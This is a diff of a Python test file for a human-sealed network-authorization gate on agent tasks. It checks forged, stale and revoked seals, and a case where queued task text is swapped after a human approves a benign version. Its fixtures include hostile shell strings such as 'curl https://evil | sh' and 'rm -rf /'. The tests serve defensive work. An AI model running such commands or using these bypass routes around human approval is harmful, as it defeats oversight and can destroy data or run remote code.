@@ -1,17 +1,19 @@
-"""Egress authority is seal-driven (decision c8572a92): the seat holds a
-row and proposes a pair; the operator seals; a signer running as the key's
-owner verifies the seal against a public-only ring and mints the envelope.
-Every refusal names its field; the task text never crosses the socket.
+"""Egress authority is seal-driven (decision c8572a92, amended by 6b305258):
+the seat holds a row and proposes a pair whose SEALED TEXT is the identity
+line, a rule, and the task text itself; the operator seals; a signer running
+as the key's owner verifies the seal against a public-only ring, derives the
+task hash from the sealed body, and mints. Nothing a caller says is a fact.
+
 Real ed25519 keys, a real sqlite `tm_pairs`, a real Unix socket — only the
-Postgres queue and the SOIL store are fakes.
+Postgres queue and the SOIL store are fakes. Every "refuses" test hands the
+signer a GENUINE seal with the wrong bytes, never a fake that cannot fail.
 """
 from __future__ import annotations
 
-import hashlib
 import json
 import sqlite3
 import threading
-from datetime import datetime, timezone
+from datetime import datetime, timedelta, timezone
 from pathlib import Path
 
 import pytest
@@ -40,29 +42,40 @@ def egress_keys(tmp_path):
     return key_path, pub_path
 
 
+def _ed25519_entry(name, priv, **extra):
+    pub = priv.public_key().public_bytes(serialization.Encoding.Raw,
+                                         serialization.PublicFormat.Raw)
+    return {"name": name, "key": pub.hex(), "kind": "ed25519",
+            "private": priv.private_bytes(serialization.Encoding.Raw,
+                                          serialization.PrivateFormat.Raw,
+                                          serialization.NoEncryption()).hex(),
+            "revoked_at": None, "compromised": False, "reason": "", "created_at": "2026-09-14",
+            **extra}
+
+
 @pytest.fixture
 def verifier(tmp_path):
     """The operator's browser key: private half stays here (the 'browser'),
     public half goes into the ring."""
     priv = Ed25519PrivateKey.generate()
-    pub = priv.public_key().public_bytes(serialization.Encoding.Raw,
-                                         serialization.PublicFormat.Raw)
     full = tmp_path / "verifiers.json"
-    full.write_text(json.dumps({"version": 1, "verifiers": [{
-        "name": "sean campbell", "key": pub.hex(), "kind": "ed25519",
-        "private": priv.private_bytes(serialization.Encoding.Raw,
-                                      serialization.PrivateFormat.Raw,
-                                      serialization.NoEncryption()).hex(),
-        "revoked_at": None, "compromised": False, "reason": "", "created_at": "2026-09-14",
-    }]}))
+    full.write_text(json.dumps({"version": 1, "verifiers": [_ed25519_entry("sean campbell", priv)]}))
     full.chmod(0o600)
-    return {"name": "sean campbell", "priv": priv, "pub": pub, "full_ring": full}
+    return {"name": "sean campbell", "priv": priv, "full_ring": full}
 
 
-def _seal(verifier, source_norm: str, target_text: str) -> dict:
+_NOW = datetime(2026, 9, 20, 23, 0, 0, tzinfo=timezone.utc)
+
+
+def _seal(verifier, source_norm: str, target_text: str, *, at=None) -> dict:
     sig = verifier["priv"].sign(ns.seal_message(source_norm, target_text, verifier["name"])).hex()
     return {"source_norm": source_norm, "target_text": target_text,
-            "verifier": verifier["name"], "seal_sig": sig}
+            "verifier": verifier["name"], "seal_sig": sig,
+            "created_at": (at or _NOW).isoformat()}
+
+
+def _fresh(verifier, source_norm, text):
+    return _seal(verifier, source_norm, text, at=datetime.now(timezone.utc))
 
 
 def _nestor_db(tmp_path) -> Path:
@@ -84,13 +97,21 @@ def _nestor_db(tmp_path) -> Path:
 
 
 def _put_pair(db, pair_id, source_norm, target_text, *, status="draft", verifier="",
-              seal_sig="", superseded_by=""):
+              seal_sig="", superseded_by="", created_at=None):
     conn = sqlite3.connect(db)
     conn.execute(
         "INSERT INTO tm_pairs (id, source_text, source_norm, source_lang, target_text, target_lang,"
         " status, verifier, created_at, seal_sig, superseded_by) VALUES (?,?,?,?,?,?,?,?,?,?,?)",
         (pair_id, source_norm, source_norm, "decision", target_text, "decision", status, verifier,
-         "2026-09-20T22:00:00Z", seal_sig, superseded_by))
+         (created_at or _NOW).isoformat(), seal_sig, superseded_by))
+    conn.commit()
+    conn.close()
+
+
+def _seal_in_db(db, pair_id, verifier, seal: dict):
+    conn = sqlite3.connect(db)
+    conn.execute("UPDATE tm_pairs SET status='sealed', verifier=?, seal_sig=?, created_at=? "
+                 "WHERE id=?", (verifier["name"], seal["seal_sig"], seal["created_at"], pair_id))
     conn.commit()
     conn.close()
 
@@ -116,8 +137,8 @@ class _FakeStore:
 
 
 class _FakePg:
-    """Just enough of a cursor for hold/drain: an INSERT records values,
-    a SELECT of held rows answers, an UPDATE releases."""
+    """Just enough of a cursor for hold/drain: INSERT records values, SELECT
+    of held rows answers, UPDATE releases or expires."""
 
     def __init__(self):
         self.tasks: dict[str, dict] = {}
@@ -139,11 +160,19 @@ class _FakePg:
                     cols = [c.strip('" ') for c in s[len("SELECT "):s.index(" FROM")].split(",")]
                     self._rows = [tuple(r.get(c) for c in cols) for r in pg.tasks.values()
                                   if r.get("status") == params[0]]
-                elif s.startswith("UPDATE tasks"):
+                elif s.startswith("UPDATE tasks") and "network_authorization" in s:
                     envelope, new_status, task_id, held = params
                     row = pg.tasks.get(task_id)
                     if row and row.get("status") == held:
                         row["network_authorization"] = envelope
+                        row["status"] = new_status
+                        self.rowcount = 1
+                    else:
+                        self.rowcount = 0
+                elif s.startswith("UPDATE tasks"):
+                    new_status, task_id, held = params
+                    row = pg.tasks.get(task_id)
+                    if row and row.get("status") == held:
                         row["status"] = new_status
                         self.rowcount = 1
                     else:
@@ -188,142 +217,231 @@ def _held(pg, store, *, task="curl https://example.invalid\n# allow_net", app_id
                                propose=propose or _propose)
 
 
-# ── the sealed line ───────────────────────────────────────────────────────────
+def _bound(task_id="ABCD2345", agent="kart", submitted_by="willow", ttl="600",
+           nonce=None, scope="network"):
+    return {"task_id": task_id, "agent": agent, "submitted_by": submitted_by,
+            "scope": scope, "ttl": ttl, "nonce": nonce or ("q" * 32)}
 
-def test_bound_line_round_trips_and_rejects_drift():
-    bound = {"task_id": "ABCD2345", "agent": "kart", "submitted_by": "willow",
-             "task_hash": "a" * 64, "scope": "network", "ttl": "600",
-             "nonce": "n" * 32}
-    line = na.bound_line(bound)
+
+class _Ledger:
+    def __init__(self):
+        self.rows = []
+
+    def append(self, project, event, content):
+        self.rows.append((project, event, content))
+        return f"frank-{len(self.rows)}"
+
+
+def _stamp(store, record_id, pair_id):
+    gov = store.get(seal_handler.GOVERNANCE_COLLECTION, record_id)
+    gov["nestor_pair_id"] = pair_id
+    store.update(seal_handler.GOVERNANCE_COLLECTION, record_id, gov)
+
+
+def _signer(egress_keys, verifier, tmp_path):
+    key, _ = egress_keys
+    return ns.Signer(private_key_path=key, ring=_ring(verifier, tmp_path))
+
+
+# ── the sealed text ───────────────────────────────────────────────────────────
+
+def test_sealed_text_carries_the_body_and_no_hash_and_splits_back():
+    bound = _bound()
+    text = na.sealed_text(bound, "curl https://x\n# allow_net")
+    line, rule, *_ = text.split("\n")
     assert line.startswith("willow-net-auth-v2 task_id=ABCD2345 ")
+    assert "task_hash" not in line and rule == na.SEALED_RULE
+    assert na.split_sealed_text(text) == (bound, "curl https://x\n# allow_net")
     assert na.parse_bound_line(line) == bound
-    assert na.parse_bound_line(line + " extra=1") is None
-    assert na.parse_bound_line(line.replace("scope=network", "scope=root")) is None
-    assert na.parse_bound_line("willow-net-auth-v1 " + line.split(" ", 1)[1]) is None
-    assert na.parse_bound_line(line + "\nsecond line") is None
+    assert na.parse_bound_line(line + " task_hash=" + "a" * 64) is None
+    assert na.split_sealed_text(line) is None                      # no rule, no body
+    assert na.split_sealed_text(line + "\nx\n---\ny") is None       # rule not on line 2
+    assert na.split_sealed_text(text + "\n---\nsmuggled") is None  # a second rule
 
 
-def test_bound_line_refuses_a_separator_in_a_value():
-    with pytest.raises(ValueError):
-        na.bound_line({"task_id": "ABCD2345", "agent": "ka rt", "submitted_by": "w",
-                       "task_hash": "a" * 64, "scope": "network", "ttl": "1", "nonce": "n" * 32})
+def test_hold_refuses_a_task_that_contains_the_rule_line():
+    pg, store = _FakePg(), _FakeStore()
+    out = _held(pg, store, task="echo hi\n---\nrm -rf /\n# allow_net")
+    assert out["error"].startswith("net_hold_denied") and "rule" in out["error"]
+    assert pg.tasks == {}
 
 
 # ── the public-only ring ──────────────────────────────────────────────────────
 
-def test_export_ring_drops_private_halves_and_load_refuses_one_that_kept_them(verifier, tmp_path):
+def test_export_ring_keeps_only_ed25519_public_halves_and_load_refuses_secrets(verifier, tmp_path):
+    mixed = tmp_path / "mixed.json"
+    hmac_secret = "ab" * 32
+    mixed.write_text(json.dumps({"version": 1, "legacy_key": "cd" * 32, "verifiers": [
+        json.loads(verifier["full_ring"].read_text())["verifiers"][0],
+        {"name": "old-shared", "key": hmac_secret, "kind": "hmac"},
+    ]}))
     out = tmp_path / "pub.json"
-    exported = ns.export_public_ring(verifier["full_ring"], out)
+    exported = ns.export_public_ring(mixed, out)
     data = json.loads(out.read_text())
     assert exported["verifiers"] == ["sean campbell"]
-    assert all("private" not in v for v in data["verifiers"])
+    assert exported["skipped"] == [{"name": "old-shared", "kind": "hmac"}]
+    assert hmac_secret not in out.read_text() and "cd" * 32 not in out.read_text()
+    assert all("private" not in v for v in data["verifiers"]) and "legacy_key" not in data
     assert data["public_only"] is True
-    ring = ns.load_public_ring(out)
-    assert ring["sean campbell"]["key"] == verifier["pub"]
+    assert list(ns.load_public_ring(out)) == ["sean campbell"]
     with pytest.raises(ValueError, match="private half"):
         ns.load_public_ring(verifier["full_ring"])
+    hm = tmp_path / "hm.json"
+    hm.write_text(json.dumps({"verifiers": [{"name": "s", "key": hmac_secret, "kind": "hmac"}]}))
+    with pytest.raises(ValueError, match="shared secret"):
+        ns.load_public_ring(hm)
+    with pytest.raises(ValueError, match="no ed25519 verifier"):
+        ns.export_public_ring(hm, tmp_path / "never.json")
+    assert not (tmp_path / "never.json").exists()
+
+
+def test_ring_must_not_be_writable_by_the_signer(tmp_path, verifier, monkeypatch):
+    from willow_mcp import lease
+
+    out = tmp_path / "pub.json"
+    ns.export_public_ring(verifier["full_ring"], out)
+    ok, why = ns.ring_is_trustworthy(out)            # tmp dir is ours: replaceable
+    assert not ok and "writable or replaceable" in why
+    monkeypatch.setattr(lease, "path_is_self_writable_or_replaceable", lambda p: False)
+    assert ns.ring_is_trustworthy(out) == (True, "ok")
+    assert ns.ring_is_trustworthy(tmp_path / "absent.json")[0] is False
 
 
 # ── the signer ────────────────────────────────────────────────────────────────
 
-def _bound_for(task, task_id="ABCD2345", agent="kart", submitted_by="willow", ttl="600",
-               nonce=None, scope="network"):
-    return {"task_id": task_id, "agent": agent, "submitted_by": submitted_by,
-            "task_hash": ea.normalized_task_hash(task), "scope": scope, "ttl": ttl,
-            "nonce": nonce or ("q" * 32)}
-
-
-def test_signer_mints_only_what_the_operator_sealed(egress_keys, verifier, tmp_path):
-    key, pub = egress_keys
-    signer = ns.Signer(private_key_path=key, ring=_ring(verifier, tmp_path))
+def test_signer_derives_the_hash_from_the_sealed_body_not_from_the_caller(egress_keys, verifier,
+                                                                            tmp_path):
+    _, pub = egress_keys
+    signer = _signer(egress_keys, verifier, tmp_path)
     task = "curl https://example.invalid\n# allow_net"
-    bound = _bound_for(task)
-    line = na.bound_line(bound)
-    seal = _seal(verifier, "authorize network for kart task abcd2345", line)
-
-    reply = signer.handle({"op": "sign_task", "seal": seal, "bound": bound, "pair_id": "p1"})
+    bound = _bound()
+    seal = _fresh(verifier, "authorize network for kart task abcd2345", na.sealed_text(bound, task))
+    reply = signer.handle({"op": "sign_task", "seal": seal, "bound": bound})
     assert reply["state"] == "minted", reply
     ok, reason, payload = ea.verify_envelope(
         public_key_path=pub, submitted_by="willow", task_id="ABCD2345", agent="kart",
         task=task, envelope=reply["envelope"])
     assert ok, reason
-    assert payload["seal_pair_id"] == "p1"
-    assert ea.seal_pair_id_of(reply["envelope"]) == "p1"
-    # The same envelope is worth nothing for any other row.
-    ok2, reason2, _ = ea.verify_envelope(
-        public_key_path=pub, submitted_by="willow", task_id="ZZZZ9999", agent="kart",
-        task=task, envelope=reply["envelope"])
-    assert not ok2 and reason2 == "task_id mismatch"
-    ok3, reason3, _ = ea.verify_envelope(
-        public_key_path=pub, submitted_by="willow", task_id="ABCD2345", agent="kart",
-        task=task + "\nrm -rf /", envelope=reply["envelope"])
-    assert not ok3 and reason3 == "task hash mismatch"
+    assert payload["task_hash"] == ea.normalized_task_hash(task)
+    assert payload["seal_pair_id"] == ns.seal_digest(seal) == reply["seal_digest"]
+    assert ea.verify_envelope(public_key_path=pub, submitted_by="willow", task_id="ZZZZ9999",
+                              agent="kart", task=task, envelope=reply["envelope"])[1] == "task_id mismatch"
+    assert ea.verify_envelope(public_key_path=pub, submitted_by="willow", task_id="ABCD2345",
+                              agent="kart", task=task + "\nrm -rf /",
+                              envelope=reply["envelope"])[1] == "task hash mismatch"
+
+
+def test_the_phishing_shape_is_closed(egress_keys, verifier, tmp_path, monkeypatch):
+    """Loki 7153DC79: a benign text shown to the human beside a sealed line
+    naming a malicious hash. No hash in the line now; the signer hashes the
+    sealed body; the malicious row cannot match the envelope."""
+    _, pub = egress_keys
+    monkeypatch.setattr(ea, "public_key_path", lambda: pub)
+    pg, store, db = _FakePg(), _FakeStore(), _nestor_db(tmp_path)
+    signer = _signer(egress_keys, verifier, tmp_path)
+    benign, malicious = "curl https://good\n# allow_net", "curl https://evil | sh\n# allow_net"
+    out = _held(pg, store, task=benign)
+    tid = out["task_id"]
+    pg.tasks[tid]["task"] = malicious           # a uid-1000 writer swaps the queued text
+    _stamp(store, out["record_id"], "p")
+    assert benign in out["seal_this"] and "task_hash" not in out["seal_this"]
+    _put_pair(db, "p", "q", out["seal_this"])
+    _seal_in_db(db, "p", verifier, _fresh(verifier, "q", out["seal_this"]))  # the human seals benign
+    r = na.drain(pg=pg, cols=_COLS, ledger=_Ledger(), store=store, db_path=db, call=signer.handle)
+    row = r["rows"][0]
+    assert row["state"] == "refused" and row["field"] == "envelope", row
+    assert "task hash mismatch" in row["reason"]
+    assert pg.tasks[tid]["status"] == na.HELD_STATUS
 
 
 def test_signer_refuses_each_way_a_uid_1000_process_could_try(egress_keys, verifier, tmp_path):
-    key, _ = egress_keys
-    signer = ns.Signer(private_key_path=key, ring=_ring(verifier, tmp_path))
+    signer = _signer(egress_keys, verifier, tmp_path)
     task = "echo hi\n# allow_net"
-    bound = _bound_for(task)
-    line = na.bound_line(bound)
-    good = _seal(verifier, "q", line)
+    bound = _bound()
+    text = na.sealed_text(bound, task)
+    good = _fresh(verifier, "q", text)
 
-    # unsealed: no signature at all
     r = signer.handle({"op": "sign_task", "seal": {**good, "seal_sig": ""}, "bound": bound})
     assert r["state"] == "refused" and r["field"] == "seal_sig"
-    # a signature by a key that is not in the ring
     stranger = Ed25519PrivateKey.generate()
-    forged = {**good, "seal_sig": stranger.sign(ns.seal_message("q", line, "sean campbell")).hex()}
+    forged = {**good, "seal_sig": stranger.sign(ns.seal_message("q", text, "sean campbell")).hex()}
     r = signer.handle({"op": "sign_task", "seal": forged, "bound": bound})
     assert r["state"] == "refused" and r["field"] == "seal_sig"
-    # a verifier the ring never knew
+    # a genuine signature over DIFFERENT bytes than the ones presented
+    other = _fresh(verifier, "q", na.sealed_text(bound, "echo other\n# allow_net"))
+    r = signer.handle({"op": "sign_task", "seal": {**good, "seal_sig": other["seal_sig"]},
+                       "bound": bound})
+    assert r["state"] == "refused" and r["field"] == "seal_sig"
     r = signer.handle({"op": "sign_task", "seal": {**good, "verifier": "mallory"}, "bound": bound})
     assert r["state"] == "refused" and r["field"] == "verifier"
-    # a sealed line that is not a bound line
-    r = signer.handle({"op": "sign_task", "seal": _seal(verifier, "q", "yes, do it"), "bound": bound})
+    r = signer.handle({"op": "sign_task", "seal": _fresh(verifier, "q", "yes, do it"), "bound": bound})
     assert r["state"] == "refused" and r["field"] == "target_text"
-    # the row drifted from what was sealed — every field is named
-    for field, value in (("task_hash", "b" * 64), ("agent", "loki"), ("nonce", "z" * 32),
-                         ("submitted_by", "hanuman"), ("ttl", "601"), ("task_id", "ZZZZ9999")):
+    for field, value in (("agent", "loki"), ("nonce", "z" * 32), ("submitted_by", "hanuman"),
+                         ("ttl", "601"), ("task_id", "ZZZZ9999"), ("scope", "database")):
         r = signer.handle({"op": "sign_task", "seal": good, "bound": {**bound, field: value}})
         assert r["state"] == "refused" and r["field"] == field, (field, r)
-    # the task text never reaches the signer
-    r = signer.handle({"op": "sign_task", "seal": good, "bound": bound, "task": task})
-    assert r["state"] == "refused" and r["field"] == "task"
+    # caller-supplied facts outside the seal are refused by name, unread
+    for extra in ("task", "task_text", "task_hash", "pair_id"):
+        r = signer.handle({"op": "sign_task", "seal": good, "bound": bound, extra: "x"})
+        assert r["state"] == "refused" and r["field"] == extra, (extra, r)
+    r = signer.handle({"op": "sign_task", "seal": good, "bound": {**bound, "task_hash": "a" * 64}})
+    assert r["state"] == "refused" and r["field"] == "bound"
+    r = signer.handle({"op": "sign_task", "seal": {**good, "pair_id": "p"}, "bound": bound})
+    assert r["state"] == "refused" and r["field"] == "pair_id"
 
 
-def test_signer_refuses_a_compromised_key(egress_keys, verifier, tmp_path):
+def test_signer_refuses_revoked_compromised_stale_and_future_seals(egress_keys, verifier, tmp_path):
     key, _ = egress_keys
+    bound = _bound()
+    text = na.sealed_text(bound, "x\n# allow_net")
+    fresh = _fresh(verifier, "q", text)
+
     ring = _ring(verifier, tmp_path)
     ring["sean campbell"]["compromised"] = True
-    signer = ns.Signer(private_key_path=key, ring=ring)
-    bound = _bound_for("x\n# allow_net")
-    r = signer.handle({"op": "sign_task", "seal": _seal(verifier, "q", na.bound_line(bound)),
-                       "bound": bound})
-    assert r["state"] == "refused" and r["field"] == "verifier"
+    r = ns.Signer(private_key_path=key, ring=ring).handle({"op": "sign_task", "seal": fresh, "bound": bound})
+    assert r["state"] == "refused" and r["field"] == "verifier" and "compromised" in r["reason"]
+
+    ring = _ring(verifier, tmp_path)
+    ring["sean campbell"]["revoked_at"] = "2026-09-19T00:00:00+00:00"   # rotated, not stolen
+    r = ns.Signer(private_key_path=key, ring=ring).handle({"op": "sign_task", "seal": fresh, "bound": bound})
+    assert r["state"] == "refused" and r["field"] == "verifier" and "revoked" in r["reason"]
+
+    signer = _signer(egress_keys, verifier, tmp_path)
+    stale = _seal(verifier, "q", text, at=datetime.now(timezone.utc) - timedelta(days=2))
+    r = signer.handle({"op": "sign_task", "seal": stale, "bound": bound})
+    assert r["state"] == "refused" and r["field"] == "created_at" and "older" in r["reason"]
+    future = _seal(verifier, "q", text, at=datetime.now(timezone.utc) + timedelta(hours=1))
+    r = signer.handle({"op": "sign_task", "seal": future, "bound": bound})
+    assert r["state"] == "refused" and r["field"] == "created_at" and "future" in r["reason"]
+    r = signer.handle({"op": "sign_task", "seal": {**fresh, "created_at": ""}, "bound": bound})
+    assert r["state"] == "refused" and r["field"] == "created_at"
 
 
-def test_signer_mints_a_lease_in_lease_py_shape(egress_keys, verifier, tmp_path, monkeypatch):
+def test_signer_mints_a_lease_from_the_sealed_reason(egress_keys, verifier, tmp_path, monkeypatch):
     from willow_mcp import lease as lease_mod
 
     key, _ = egress_keys
     apps = tmp_path / "apps"
     monkeypatch.setenv("WILLOW_MCP_APPS_ROOT", str(apps))
     signer = ns.Signer(private_key_path=key, ring=_ring(verifier, tmp_path), lease_root=apps)
-    reason = "Friday morning fun"
-    bound = {"app_id": "willow", "ttl": "1800",
-             "reason_sha": hashlib.sha256(reason.encode()).hexdigest()[:16], "scope": "lease"}
-    line = na.lease_bound_line(bound)
-    r = signer.handle({"op": "sign_lease", "seal": _seal(verifier, "grant", line), "bound": bound,
-                       "reason": reason, "pair_id": "pl"})
+    bound = {"app_id": "willow", "ttl": "1800", "scope": "lease"}
+    text = na.sealed_lease_text(bound, "Friday morning fun")
+    r = signer.handle({"op": "sign_lease", "seal": _fresh(verifier, "grant", text), "bound": bound})
     assert r["state"] == "minted", r
     state = lease_mod.read_lease("willow")
     assert state["status"] == "active" and state["issuer"] == "seal:sean campbell"
-    assert state["reason"] == reason
-    # a different reason text than the sealed sha is refused
-    r = signer.handle({"op": "sign_lease", "seal": _seal(verifier, "grant", line), "bound": bound,
-                       "reason": "something else"})
-    assert r["state"] == "refused" and r["field"] == "reason"
+    assert state["reason"] == "Friday morning fun"
+    # the reason is inside the sealed bytes: a seal over a different reason carries THAT reason
+    text2 = na.sealed_lease_text(bound, "something else")
+    r = signer.handle({"op": "sign_lease", "seal": _fresh(verifier, "grant", text2), "bound": bound})
+    assert r["state"] == "minted" and lease_mod.read_lease("willow")["reason"] == "something else"
+    r = signer.handle({"op": "sign_lease", "seal": _fresh(verifier, "grant", text),
+                       "bound": {**bound, "app_id": "loki"}})
+    assert r["state"] == "refused" and r["field"] == "app_id"
+    # a task seal presented as a lease seal is not a lease
+    r = signer.handle({"op": "sign_lease", "seal": _fresh(verifier, "q", na.sealed_text(_bound(), "x")),
+                       "bound": bound})
+    assert r["state"] == "refused" and r["field"] == "target_text"
 
 
 # ── the socket ────────────────────────────────────────────────────────────────
@@ -346,39 +464,41 @@ def live_signer(egress_keys, verifier, tmp_path):
 def test_socket_round_trip_and_three_states(live_signer, verifier, tmp_path):
     sock, pub = live_signer
     task = "wget https://x\n# allow_net"
-    bound = _bound_for(task)
-    seal = _seal(verifier, "q", na.bound_line(bound))
-    reply = na.signer_call({"op": "sign_task", "seal": seal, "bound": bound, "pair_id": "p"},
-                           path=sock)
+    bound = _bound()
+    seal = _fresh(verifier, "q", na.sealed_text(bound, task))
+    reply = na.signer_call({"op": "sign_task", "seal": seal, "bound": bound}, path=sock)
     assert reply["state"] == "minted"
-    assert ea.verify_envelope(public_key_path=pub, submitted_by="willow", task_id="ABCD2345",
-                              agent="kart", task=task, envelope=reply["envelope"])[0]
-    # refused travels with its field
+    ok, _, payload = ea.verify_envelope(public_key_path=pub, submitted_by="willow", task_id="ABCD2345",
+                                        agent="kart", task=task, envelope=reply["envelope"])
+    assert ok and payload["task_hash"] == ea.normalized_task_hash(task)
+    # a genuine seal, wrong bytes on the wire -> refused over the socket
+    reply = na.signer_call({"op": "sign_task", "seal": {**seal, "target_text": seal["target_text"] + " "},
+                            "bound": bound}, path=sock)
+    assert reply["state"] == "refused" and reply["field"] == "seal_sig"
     reply = na.signer_call({"op": "sign_task", "seal": seal, "bound": {**bound, "agent": "loki"}},
                            path=sock)
     assert reply["state"] == "refused" and reply["field"] == "agent"
-    # the client refuses to send the task text before it touches the socket
-    reply = na.signer_call({"op": "sign_task", "seal": seal, "bound": bound, "task": task}, path=sock)
-    assert reply["state"] == "refused"
-    # no signer -> unreachable, never an exception
+    for extra in ("task", "task_hash", "pair_id"):
+        reply = na.signer_call({"op": "sign_task", "seal": seal, "bound": bound, extra: "x"}, path=sock)
+        assert reply["state"] == "refused" and reply["field"] == extra
     reply = na.signer_call({"op": "sign_task"}, path=tmp_path / "absent")
     assert reply["state"] == "unreachable" and "socket" in reply
 
 
 # ── request: hold and propose ─────────────────────────────────────────────────
 
-def test_hold_inserts_an_unclaimable_row_and_proposes_one_sealable_line():
+def test_hold_inserts_an_unclaimable_row_and_proposes_the_sealed_text():
     pg, store = _FakePg(), _FakeStore()
     out = _held(pg, store)
     assert out["status"] == na.HELD_STATUS and out["pair_id"].startswith("pair-net-auth-")
     row = pg.tasks[out["task_id"]]
     assert row["status"] == na.HELD_STATUS and row["submitted_by"] == "willow"
-    bound = na.parse_bound_line(out["seal_this"])
-    assert bound["task_id"] == out["task_id"]
-    assert bound["task_hash"] == ea.normalized_task_hash(row["task"])
+    bound, body = na.split_sealed_text(out["seal_this"])
+    assert bound["task_id"] == out["task_id"] and body == row["task"]
+    assert "task_hash" not in out["seal_this"]
     gov = store.get(seal_handler.GOVERNANCE_COLLECTION, na.record_id_for_task(out["task_id"]))
-    assert gov["ruling"] == out["seal_this"] and gov["rationale"] == row["task"]
-    assert gov["kind"] == "net-authorization-request"
+    assert gov["ruling"] == out["seal_this"] and gov["held_at"]
+    assert gov["kind"] == "net-authorization-request" and "task_hash" not in gov
 
 
 def test_hold_does_not_insert_when_the_propose_fails():
@@ -388,86 +508,107 @@ def test_hold_does_not_insert_when_the_propose_fails():
     assert pg.tasks == {}
 
 
+def test_propose_lease_seals_the_reason_inside_the_text():
+    store = _FakeStore()
+    out = na.propose_lease(app_id="willow", ttl_seconds=1800, reason="Friday morning fun",
+                           store=store,
+                           propose=lambda app, rid, store=None, db_path=None: {"pair_id": "pl"})
+    assert out["status"] == "proposed"
+    bound, reason = na.split_sealed_lease_text(out["seal_this"])
+    assert bound == {"app_id": "willow", "ttl": "1800", "scope": "lease"}
+    assert reason == "Friday morning fun"
+
+
 # ── act: the tick ─────────────────────────────────────────────────────────────
 
-def _stamp(store, record_id, pair_id):
-    gov = store.get(seal_handler.GOVERNANCE_COLLECTION, record_id)
-    gov["nestor_pair_id"] = pair_id
-    store.update(seal_handler.GOVERNANCE_COLLECTION, record_id, gov)
-
-
-class _Ledger:
-    def __init__(self):
-        self.rows = []
-
-    def append(self, project, event, content):
-        self.rows.append((project, event, content))
-        return f"frank-{len(self.rows)}"
-
-
-def test_tick_waits_on_a_draft_mints_on_a_seal_and_is_quiet_after(egress_keys, verifier, tmp_path,
-                                                                     monkeypatch):
-    key, pub = egress_keys
+def test_tick_waits_on_a_draft_refuses_a_forged_seal_mints_on_a_real_one(egress_keys, verifier,
+                                                                           tmp_path, monkeypatch):
+    _, pub = egress_keys
     monkeypatch.setattr(ea, "public_key_path", lambda: pub)
     pg, store, db = _FakePg(), _FakeStore(), _nestor_db(tmp_path)
     ledger = _Ledger()
-    signer = ns.Signer(private_key_path=key, ring=_ring(verifier, tmp_path))
-    call = signer.handle
+    signer = _signer(egress_keys, verifier, tmp_path)
 
     out = _held(pg, store)
     tid, rid = out["task_id"], out["record_id"]
     _stamp(store, rid, "pair-1")
     _put_pair(db, "pair-1", "q", out["seal_this"])  # draft, unsealed
 
-    r = na.drain(pg=pg, cols=_COLS, ledger=ledger, store=store, db_path=db, call=call)
+    r = na.drain(pg=pg, cols=_COLS, ledger=ledger, store=store, db_path=db, call=signer.handle)
     assert r["state"] == "populated" and r["rows"][0]["state"] == "waiting"
     assert r["rows"][0]["why"] == "status=draft"
     assert pg.tasks[tid]["status"] == na.HELD_STATUS and ledger.rows == []
 
-    # the operator seals it
-    sealed = _seal(verifier, "q", out["seal_this"])
-    conn = sqlite3.connect(db)
-    conn.execute("UPDATE tm_pairs SET status='sealed', verifier=?, seal_sig=? WHERE id='pair-1'",
-                 (verifier["name"], sealed["seal_sig"]))
-    conn.commit()
-    conn.close()
+    # a stranger's signature written into the db as if sealed: refused, inked
+    stranger = Ed25519PrivateKey.generate()
+    fake = {"seal_sig": stranger.sign(ns.seal_message("q", out["seal_this"], "sean campbell")).hex(),
+            "created_at": datetime.now(timezone.utc).isoformat()}
+    _seal_in_db(db, "pair-1", verifier, fake)
+    r = na.drain(pg=pg, cols=_COLS, ledger=ledger, store=store, db_path=db, call=signer.handle)
+    assert r["rows"][0]["state"] == "refused" and r["rows"][0]["field"] == "seal_sig"
+    assert ledger.rows[-1][1] == na.EVENT_REFUSED and pg.tasks[tid]["status"] == na.HELD_STATUS
 
-    r = na.drain(pg=pg, cols=_COLS, ledger=ledger, store=store, db_path=db, call=call)
+    # the operator seals it for real
+    _seal_in_db(db, "pair-1", verifier, _fresh(verifier, "q", out["seal_this"]))
+    r = na.drain(pg=pg, cols=_COLS, ledger=ledger, store=store, db_path=db, call=signer.handle)
     row = r["rows"][0]
     assert row["state"] == "minted" and row["released_to"] == "pending", row
     assert pg.tasks[tid]["status"] == "pending"
     ok, reason, payload = ea.verify_envelope(
         public_key_path=pub, submitted_by="willow", task_id=tid, agent="kart",
         task=pg.tasks[tid]["task"], envelope=pg.tasks[tid]["network_authorization"])
-    assert ok and payload["seal_pair_id"] == "pair-1"
+    assert ok and payload["seal_pair_id"] == row["seal_digest"]
     assert ledger.rows[-1][1] == na.EVENT_MINTED
     assert ledger.rows[-1][2]["pair_id"] == "pair-1" and ledger.rows[-1][2]["verifier"] == "sean campbell"
+    assert ledger.rows[-1][2]["seal_digest"] == row["seal_digest"]
 
-    # next tick: nothing held
-    r = na.drain(pg=pg, cols=_COLS, ledger=ledger, store=store, db_path=db, call=call)
+    r = na.drain(pg=pg, cols=_COLS, ledger=ledger, store=store, db_path=db, call=signer.handle)
     assert r["state"] == "empty"
 
 
 def test_tick_refuses_a_row_that_drifted_from_its_seal_and_inks_it(egress_keys, verifier, tmp_path,
                                                                      monkeypatch):
-    key, pub = egress_keys
+    _, pub = egress_keys
     monkeypatch.setattr(ea, "public_key_path", lambda: pub)
     pg, store, db = _FakePg(), _FakeStore(), _nestor_db(tmp_path)
     ledger = _Ledger()
-    signer = ns.Signer(private_key_path=key, ring=_ring(verifier, tmp_path))
+    signer = _signer(egress_keys, verifier, tmp_path)
     out = _held(pg, store)
     tid, rid = out["task_id"], out["record_id"]
     _stamp(store, rid, "pair-2")
-    sealed = _seal(verifier, "q", out["seal_this"])
-    _put_pair(db, "pair-2", "q", out["seal_this"], status="sealed", verifier=verifier["name"],
-              seal_sig=sealed["seal_sig"])
-    # the row's text changes under the seal (an agent edited the queue)
-    pg.tasks[tid]["task"] = "curl https://evil\n# allow_net"
+    _put_pair(db, "pair-2", "q", out["seal_this"])
+    _seal_in_db(db, "pair-2", verifier, _fresh(verifier, "q", out["seal_this"]))
+    pg.tasks[tid]["agent"] = "loki"              # the row's agent changes under the seal
     r = na.drain(pg=pg, cols=_COLS, ledger=ledger, store=store, db_path=db, call=signer.handle)
     row = r["rows"][0]
-    assert row["state"] == "refused" and row["field"] == "task_hash"
+    assert row["state"] == "refused" and row["field"] == "agent"
     assert pg.tasks[tid]["status"] == na.HELD_STATUS
-    assert ledger.rows[-1][1] == na.EVENT_REFUSED and ledger.rows[-1][2]["field"] == "task_hash"
